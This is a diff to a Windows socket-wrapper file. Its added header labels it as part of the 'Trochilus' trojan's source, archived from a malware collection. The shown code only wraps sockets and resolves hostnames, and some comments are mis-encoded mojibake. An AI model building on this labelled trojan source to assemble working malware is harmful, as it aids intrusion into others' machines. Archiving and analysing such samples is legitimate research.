@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "winSocket.h"
 
 winSocket::winSocket() : m_hSocket(0),
@@ -50,7 +61,7 @@ int winSocket::Close( void )
 long winSocket::DNS(char *strRemote)
 {
 	hostent *hostEnt = NULL;
-	hostEnt = gethostbyname( strRemote );//¸ù¾İÓòÃû»ñÈ¡µØÖ·
+	hostEnt = gethostbyname( strRemote );//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¡ï¿½ï¿½Ö·
 
 	if( hostEnt != NULL )
 		return ((in_addr*)hostEnt->h_addr)->s_addr;
